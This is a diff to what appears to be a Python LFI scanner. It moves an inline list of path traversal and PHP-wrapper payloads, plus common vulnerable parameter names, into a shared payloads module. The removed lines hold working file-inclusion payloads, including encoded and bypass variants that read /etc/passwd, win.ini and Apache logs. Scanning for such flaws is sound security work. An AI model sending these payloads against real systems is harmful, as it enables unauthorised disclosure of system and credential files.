@@ -1,36 +1,6 @@
 import requests
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-
-PAYLOADS = [
-    # Basic
-    "../../../../etc/passwd",
-    "../../../../../etc/passwd",
-    "../../../../../../etc/passwd",
-    # Encoded
-    "..%2f..%2f..%2f..%2fetc%2fpasswd",
-    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-    # Double encoding
-    "%252e%252e%252fetc%252fpasswd",
-    # Windows
-    "..\\..\\..\\..\\windows\\win.ini",
-    # Null byte
-    "../../../../etc/passwd%00",
-    # PHP wrappers
-    "php://filter/convert.base64-encode/resource=index.php",
-    "php://input",
-    # Log files
-    "../../../../var/log/apache2/access.log",
-    # Bypass
-    "....//....//etc/passwd",
-    "..;/..;/..;/etc/passwd",
-    "..%c0%af..%c0%afetc/passwd",
-]
-
-
-COMMON_PARAMS = [
-    "file", "page", "include", "path",
-    "template", "view", "doc", "folder",
-]
+from app.scanner.payloads import LFI_PAYLOADS as PAYLOADS, LFI_COMMON_PARAMS as COMMON_PARAMS
 
 REQUEST_TIMEOUT = 3
 
